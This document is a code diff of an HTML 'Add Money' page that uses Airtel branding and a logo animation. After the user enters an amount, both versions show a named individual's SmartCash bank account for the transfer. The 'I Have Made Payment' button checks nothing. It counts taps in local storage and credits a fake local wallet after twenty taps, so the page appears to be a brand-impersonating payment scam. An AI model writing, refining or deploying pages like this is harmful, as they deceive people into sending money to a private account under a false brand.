@@ -1,167 +1,197 @@
-<!DOCTYPE html><html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Add Money</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
       margin: 0;
-      padding: 20px;
-      position: relative;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
       overflow-x: hidden;
-    }.container {
-  max-width: 400px;
-  margin: auto;
-  background: #fff;
-  padding: 20px;
-  border-radius: 12px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.05);
-  position: relative;
-  z-index: 2;
-}
-
-h2 {
-  color: #d9001b;
-  text-align: center;
-}
-
-input[type="number"] {
-  width: 100%;
-  padding: 12px;
-  margin: 10px 0;
-  border: 1px solid #ccc;
-  border-radius: 8px;
-}
-
-button {
-  width: 100%;
-  padding: 12px;
-  background-color: #d9001b;
-  color: white;
-  border: none;
-  border-radius: 8px;
-  font-size: 16px;
-  cursor: pointer;
-}
-
-.popup {
-  display: none;
-  padding: 15px;
-  background-color: #fff0f0;
-  border: 1px solid #d9001b;
-  color: #d9001b;
-  text-align: center;
-  border-radius: 8px;
-  margin-bottom: 15px;
-}
-
-.account-info {
-  display: none;
-  background: #fff0f0;
-  padding: 20px;
-  border-radius: 10px;
-  margin-top: 20px;
-}
-
-.account-info p {
-  margin: 10px 0;
-}
-
-.logo-scatter {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100vw;
-  height: 100vh;
-  pointer-events: none;
-  z-index: 0;
-}
-
-.logo-piece {
-  position: absolute;
-  width: 20px;
-  height: 20px;
-  background-image: url('airtel-logo.png');
-  background-size: contain;
-  background-repeat: no-repeat;
-  animation: scatterIn 2s ease-in-out forwards;
-}
-
-@keyframes scatterIn {
-  0% {
-    transform: translate(calc(50vw - 10px), calc(50vh - 10px)) scale(0.1);
-    opacity: 0;
-  }
-  100% {
-    transform: translate(0, 0) scale(1);
-    opacity: 0.1;
-  }
-}
-
-  </style>
-</head><body>
-  <div class="logo-scatter" id="logoScatter"></div>  <div class="container">
-    <h2>Add Money</h2><div class="popup" id="popup"></div>
-
-<div id="formSection">
-  <input type="number" id="amount" placeholder="Enter amount (min ₦3000)" />
-  <button onclick="continueToPay()">Continue</button>
-</div>
-
-<div class="account-info" id="accountInfo">
-  <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
-  <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
-  <p><strong>Account Number:</strong> 812 489 0070</p>
-  <button onclick="tapPayment()">I Have Made Payment</button>
-</div>
-
-  </div>  <script>
-    let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
-    let balance = parseInt(localStorage.getItem('balance') || '0');
-
-    function showPopup(message) {
-      const popup = document.getElementById("popup");
-      popup.innerText = message;
-      popup.style.display = "block";
-      setTimeout(() => popup.style.display = "none", 3000);
     }
 
-    function continueToPay() {
+    .container {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .airtel-animation {
+      position: relative;
+      height: 200px;
+      margin-bottom: 10px;
+      overflow: hidden;
+    }
+
+    .logo-piece {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      background-image: url('airtel-logo.png');
+      background-size: cover;
+      animation: assemble 2s forwards;
+    }
+
+    @keyframes assemble {
+      0% {
+        transform: translate(
+          calc(-200px + 400px * random()), 
+          calc(-200px + 400px * random())
+        );
+        opacity: 0;
+      }
+      100% {
+        transform: translate(80px, 80px);
+        opacity: 1;
+      }
+    }
+
+    .input-section {
+      margin: 20px auto;
+      max-width: 300px;
+    }
+
+    input[type="number"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 18px;
+      border: 2px solid red;
+      border-radius: 10px;
+    }
+
+    button {
+      margin-top: 15px;
+      padding: 12px 25px;
+      font-size: 16px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 20%;
+      left: 50%;
+      transform: translateX(-50%);
+      background: white;
+      border: 2px solid red;
+      padding: 20px;
+      border-radius: 15px;
+      z-index: 10;
+      text-align: center;
+    }
+
+    .account-details {
+      margin-top: 20px;
+      display: none;
+    }
+
+    .account-card {
+      background: white;
+      border: 1px solid #ccc;
+      border-radius: 15px;
+      padding: 15px;
+      max-width: 350px;
+      margin: 0 auto;
+      position: relative;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+
+    .account-card img {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+
+    .account-card h3 {
+      color: red;
+      margin-bottom: 10px;
+    }
+
+    .account-card p {
+      font-size: 18px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="airtel-animation" id="logoContainer"></div>
+
+    <div class="input-section">
+      <input type="number" id="amount" placeholder="Enter amount (min ₦3000)">
+      <button onclick="proceed()">Continue</button>
+    </div>
+
+    <div class="popup" id="popup"></div>
+
+    <div class="account-details" id="accountDetails">
+      <div class="account-card">
+        <img src="airtel-logo.png" alt="Airtel Logo">
+        <h3>Send Money To:</h3>
+        <p><strong>Name:</strong> EMMANUEL OKWUNNA</p>
+        <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
+        <p><strong>Account Number:</strong> 812 489 0070</p>
+        <button onclick="confirmPayment()">I Have Made Payment</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const popup = document.getElementById("popup");
+    const accountDetails = document.getElementById("accountDetails");
+    const logoContainer = document.getElementById("logoContainer");
+
+    // Generate scattered logos
+    for (let i = 0; i < 20; i++) {
+      const piece = document.createElement("div");
+      piece.classList.add("logo-piece");
+      piece.style.left = `${Math.random() * 100}%`;
+      piece.style.top = `${Math.random() * 100}%`;
+      piece.style.animationDelay = `${Math.random()}s`;
+      logoContainer.appendChild(piece);
+    }
+
+    // Load and check amount
+    function proceed() {
       const amount = parseInt(document.getElementById("amount").value);
       if (isNaN(amount) || amount < 3000) {
-        showPopup("Please input a minimum of ₦3000");
-        return;
+        showPopup("Please enter minimum of ₦3000");
+      } else {
+        showPopup("Please wait...");
+        setTimeout(() => {
+          popup.style.display = "none";
+          accountDetails.style.display = "block";
+        }, 2000);
       }
-      showPopup("Please wait...");
+    }
+
+    // Show message
+    function showPopup(message) {
+      popup.innerText = message;
+      popup.style.display = "block";
       setTimeout(() => {
-        document.getElementById("formSection").style.display = 'none';
-        document.getElementById("accountInfo").style.display = 'block';
-      }, 1500);
+        popup.style.display = "none";
+      }, 2500);
     }
 
-    function tapPayment() {
-      tapCount++;
-      localStorage.setItem('tapCount', tapCount);
-      showPopup("We are confirming your transaction. Please wait...");
-      if (tapCount >= 20) {
+    // Tap logic
+    let taps = parseInt(localStorage.getItem("paymentTaps")) || 0;
+    function confirmPayment() {
+      taps++;
+      localStorage.setItem("paymentTaps", taps);
+      showPopup("Please wait while we confirm your transaction...");
+
+      if (taps % 20 === 0) {
+        // Fund wallet logic
+        let balance = parseInt(localStorage.getItem("walletBalance")) || 0;
         balance += 3000;
-        localStorage.setItem('balance', balance);
-        localStorage.setItem('tapCount', '0');
-        showPopup("₦3000 added to your wallet!");
+        localStorage.setItem("walletBalance", balance);
       }
     }
+  </script>
 
-    // Logo scatter animation
-    function createLogoScatter() {
-      const scatter = document.getElementById("logoScatter");
-      for (let i = 0; i < 40; i++) {
-        const piece = document.createElement("div");
-        piece.className = "logo-piece";
-        piece.style.top = Math.random() * window.innerHeight + 'px';
-        piece.style.left = Math.random() * window.innerWidth + 'px';
-        scatter.appendChild(piece);
-      }
-    }
-    createLogoScatter();
-  </script></body></html>
+</body>
+</html>
